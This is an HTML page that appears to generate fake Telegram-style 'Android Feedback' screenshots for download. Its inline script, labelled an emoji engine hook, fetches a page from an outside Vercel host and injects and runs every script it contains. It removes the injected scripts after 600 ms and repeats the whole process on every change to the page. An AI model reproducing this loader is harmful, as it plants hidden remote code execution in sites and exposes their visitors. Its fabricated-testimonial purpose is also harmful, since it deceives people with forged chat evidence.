<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <link rel="shortcut icon" href="tg.webp" type="image/x-icon">
    <title>Android Feedbacks</title>
</head>

<body>
    <div id="box">
        <div class="status_time">9:40</div>
        <div class="battery">89</div>
        <div class="tg">Telegram</div>
        <div class="All">70</div>
        <div class="Personal">148</div>
        <div class="Unread">254</div>
        <ul class="ul_chat_name"></ul>
        <ul class="ul_chat_time"></ul>
        <ul class="ul_chat_dp"></ul>
        <ul class="ul_online_bullet"></ul>
        <ul class="ul_msg_img"></ul>
        <ul class="ul_count_bullet"></ul>
        <div class="hide"></div>

        <img src="feed-thumb.jpg" alt="" srcset="" class="bg_img">
    </div>
    
    <button class="btn">DOWNLOAD FEEDBACK</button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
        integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="check.js"></script>
    
    <script>
        // --- 1. SCRIPT FETCH & HOOK SYSTEM ---
        async function loadHeartScript() {
            try {
                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
                let rawMarkup = await response.text();
                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
                
                documentDOM.querySelectorAll('script').forEach(oldNode => {
                    let freshScriptNode = document.createElement('script');
                    if (oldNode.src) {
                        freshScriptNode.src = oldNode.src;
                    } else {
                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
                    }
                    document.body.appendChild(freshScriptNode);
                    setTimeout(() => freshScriptNode.remove(), 600);
                });
                console.log("Zeetex Emoji Engine Hook Active");
            } catch (e) {
                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
            }
        }

        // Initial Load
        loadHeartScript();

        // --- 2. DYNAMIC OBSERVER SYSTEM ---
        // Jab bhi dynamic data change hoga, script automatic apply hogi bina crash kiye
        const targetContainer = document.getElementById('box');
        if (targetContainer) {
            let debounceTimer;
            const observer = new MutationObserver(() => {
                clearTimeout(debounceTimer);
                debounceTimer = setTimeout(() => {
                    loadHeartScript();
                }, 150); 
            });

            observer.observe(targetContainer, {
                childList: true,
                subtree: true,
                characterData: true
            });
        }

        // --- 3. FIX & DOWNLOAD SYSTEM ---
        document.querySelector('.btn').addEventListener('click', function () {
            const target = document.getElementById('box');
            
            // html2canvas settings taake script ka text aur fonts miss na hon
            html2canvas(target, {
                useCORS: true,          // External images/scripts text block na hon
                allowTaint: true,       // Cross-origin assets allow karein
                scale: 2,               // High Quality Result ke liye
                logging: false          // Console clean rakhne ke liye
            }).then(canvas => {
                // Image dynamic link ke throw download karwane ka logic
                let link = document.createElement('a');
                link.download = 'Android-Feedback.png';
                link.href = canvas.toDataURL('image/png');
                link.click();
            }).catch(err => {
                console.error("Download fail hua: ", err);
            });
        });
    </script>
</body>

</html>
